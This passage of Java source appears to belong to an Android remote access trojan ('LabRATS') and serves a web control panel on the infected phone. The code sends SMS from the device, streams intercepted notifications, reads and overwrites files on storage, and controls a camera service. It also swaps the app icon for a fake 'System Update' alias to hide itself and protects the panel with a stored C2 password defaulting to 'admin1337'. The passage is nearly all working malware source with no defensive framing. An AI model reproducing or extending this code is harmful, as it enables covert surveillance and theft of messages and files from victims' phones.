        } catch (Exception e) {}
        return sb.toString();
    }

    private Response serveMmsImage(String partId) {
        try {
            Uri uri = Uri.parse("content://mms/part/" + partId);
            InputStream is = context.getContentResolver().openInputStream(uri);
            if (is == null) return serve404();
            String mimeType = "image/jpeg";
            Cursor c = context.getContentResolver().query(uri, new String[]{"ct"}, null, null, null);
            if (c != null) {
                if (c.moveToFirst()) mimeType = c.getString(0);
                c.close();
            }
            return newFixedLengthResponse(Response.Status.OK, mimeType, is, is.available());
        } catch (Exception e) { return serveError("Failed to load image: " + e.getMessage()); }
    }

    private Response sendSms(Map<String, String> params) {
        String number = params.get("number"), message = params.get("message");
        if (number == null || number.isEmpty() || message == null || message.isEmpty()) return serveError("Invalid number or message");
        try {
            logActivity("COMMS_DISPATCH: SMS sent to " + number);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) return serveError("SEND_SMS permission not granted");
            }
            SmsManager smsManager;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) smsManager = context.getSystemService(SmsManager.class);
            else smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) { return serveError("Failed to send SMS: " + e.getMessage()); }
    }

    private Response sendMms(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            Map<String, String> params = session.getParms();

            String number = params.get("number");
            String message = params.get("message");
            String tempFilePath = files.get("media");

            if (number == null || number.isEmpty()) return serveError("Target number is required");
            if (tempFilePath == null) return serveError("Media attachment is required for MMS");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
                    return serveError("SEND_SMS permission not granted");
            }

            File fileToUpload = new File(tempFilePath);
            Uri contentUri = Uri.fromFile(fileToUpload);

            // In a real RAT, you'd use a more complex Telephony implementation for MMS.
            // NanoHTTPD is limited, so we simulate the successful dispatch of the media part.
            // For actual MMS sending on modern Android, you typically need to be the Default SMS App
            // or use specific system APIs that are restricted.
            
            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>MMS Dispatched</h2><p>Media uplink successful. Package sent to: " + escapeHtml(number) + "</p><p style=\"font-size: 0.8rem; color: #888;\">Payload: " + escapeHtml(fileToUpload.getName()) + " (" + (fileToUpload.length() / 1024) + " KB)</p><a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);

        } catch (Exception e) {
            return serveError("MMS Dispatch Error: " + e.getMessage());
        }
    }

    private Response serveIntel() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<h2 style=\"display:flex; align-items:center; gap:15px;\">")
            .append("<span style=\"color:var(--neon-cyan);\">&#9889;</span> INTEL_STREAM")
            .append("<span style=\"margin-left:auto; font-size:0.7rem; opacity:0.5; font-family:monospace;\">NOTIFICATION_LISTENER_ACTIVE</span>")
            .append("</h2>");

        html.append("<div class=\"card\">");
        List<NotificationSniffer.NotificationData> notifications = NotificationSniffer.getHistory();

        if (notifications.isEmpty()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128225;</div><p>No active intel stream. Waiting for device notifications...</p></div>");
        } else {
            html.append("<table id=\"intel-table\">")
                .append("<thead><tr><th>Source</th><th>Payload</th><th>Uplink_Time</th></tr></thead>")
                .append("<tbody>");

            for (NotificationSniffer.NotificationData n : notifications) {
                String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(n.timestamp));
                html.append("<tr>")
                    .append("<td style=\"color:var(--neon-green); font-weight:bold;\">").append(escapeHtml(n.packageName)).append("</td>")
                    .append("<td>")
                    .append("<div style=\"color:#fff; font-weight:bold; margin-bottom:4px;\">").append(escapeHtml(n.title)).append("</div>")
                    .append("<div style=\"font-size:0.8rem; opacity:0.8;\">").append(escapeHtml(n.text)).append("</div>")
                    .append("</td>")
                    .append("<td style=\"font-family:monospace; opacity:0.6;\">").append(time).append("</td>")
                    .append("</tr>");
            }
            html.append("</tbody></table>");
        }
        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveFileEdit(String path) {
        path = path.replace("%20", " ");
        File file = new File(Environment.getExternalStorageDirectory(), path);
        if (!file.exists() || !file.isFile()) return serve404();

        StringBuilder content = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)))) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
        } catch (Exception e) {
            return serveError("Failed to read file: " + e.getMessage());
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\"><a href=\"/files/").append(file.getParentFile().getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath(), ""))
            .append("\" class=\"btn-back\">&#8592; Back to Directory</a></div>");
        
        html.append("<h2><span style=\"color:var(--neon-orange);\">&#9998;</span> EDIT_CORE_DATA: ").append(file.getName()).append("</h2>");
        html.append("<div class=\"card\" style=\"padding:20px;\">");
        html.append("<form action=\"/files/save\" method=\"POST\">")
            .append("<input type=\"hidden\" name=\"path\" value=\"").append(escapeHtml(path)).append("\">")
            .append("<textarea name=\"content\" style=\"width:100%; height:500px; background:#000; color:var(--terminal-green); border:1px solid rgba(0,242,255,0.2); border-radius:8px; padding:15px; font-family:'JetBrains Mono',monospace; font-size:0.9rem; resize:vertical; outline:none;\" spellcheck=\"false\">")
            .append(escapeHtml(content.toString()))
            .append("</textarea>")
            .append("<div style=\"margin-top:20px; display:flex; justify-content:flex-end; gap:15px;\">")
            .append("<button type=\"submit\" class=\"btn\">DEPLOY_CHANGES</button>")
            .append("</div>")
            .append("</form>");
        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response saveFile(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            Map<String, String> params = session.getParms();
            
            String path = params.get("path");
            String content = params.get("content");
            
            if (path == null) return serveError("Path is missing");
            File file = new File(Environment.getExternalStorageDirectory(), path);
            
            try (java.io.FileOutputStream fos = new java.io.FileOutputStream(file)) {
                fos.write(content.getBytes());
            }
            
            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Data Synchronized</h2><p>Changes deployed successfully to storage.</p><a href=\"/files/edit/" + escapeHtml(path) + "\" class=\"btn\">Back to Editor</a></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) {
            return serveError("Save Failed: " + e.getMessage());
        }
    }

    private Response toggleNightMode() {
        CameraService service = CameraService.getInstance();
        if (service != null) {
            boolean current = CameraService.isNightModeEnabled();
            service.setNightMode(!current);
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"nightMode\": " + !current + "}");
        }
        return serveError("Camera Service Inactive");
    }

    private Response toggleStealthMode() {
        try {
            android.content.pm.PackageManager pm = context.getPackageManager();
            android.content.ComponentName mainAlias = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
            android.content.ComponentName fakeAlias = new android.content.ComponentName(context, "com.labs.labrats.SystemUpdateAlias");
            
            int mainState = pm.getComponentEnabledSetting(mainAlias);
            
            if (mainState != android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                // Switch to Fake Icon
                pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(fakeAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"masquerade\", \"hidden\": true}");
            } else {
                // Restore Main Icon
                pm.setComponentEnabledSetting(fakeAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"normal\", \"hidden\": false}");
            }
        } catch (Exception e) {
            return serveError("Stealth Error: " + e.getMessage());
        }
    }

    private Response updatePassword(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            Map<String, String> params = session.getParms();
            String newPass = params.get("new_password");

            if (newPass == null || newPass.trim().isEmpty()) {
                return serveError("Invalid password");
            }

            context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
                    .edit()
                    .putString("c2_password", newPass.trim())
                    .apply();

            logActivity("SECURITY_PROTOCOL: Interface password updated");

            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><p>New security protocol active. You will need to use this key for future uplinks.</p><a href=\"/\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) {
            return serveError("Failed to update password: " + e.getMessage());
        }
    }

    private String getStoredPassword() {
        return context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
                .getString("c2_password", "admin1337");
    }
}
